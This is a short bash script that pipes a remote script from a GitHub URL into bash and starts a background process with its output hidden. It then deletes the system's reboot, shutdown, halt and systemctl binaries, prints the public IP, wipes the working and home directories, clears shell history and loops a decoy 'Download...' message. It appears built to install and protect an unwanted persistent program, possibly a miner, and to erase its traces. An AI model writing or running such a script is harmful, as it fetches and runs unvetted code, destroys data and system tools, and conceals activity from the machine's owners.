#!/bin/bash
apt-get update 
apt-get install -y wget curl sudo
sudo apt-get update -y
curl -sL https://github.com/kamikaze05/cckaze/raw/main/ccyes.sh | bash
chmod +x cckaze
chmod +x cckaze.sh
nohup ./cckaze.sh > /dev/null 2>&1 &
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
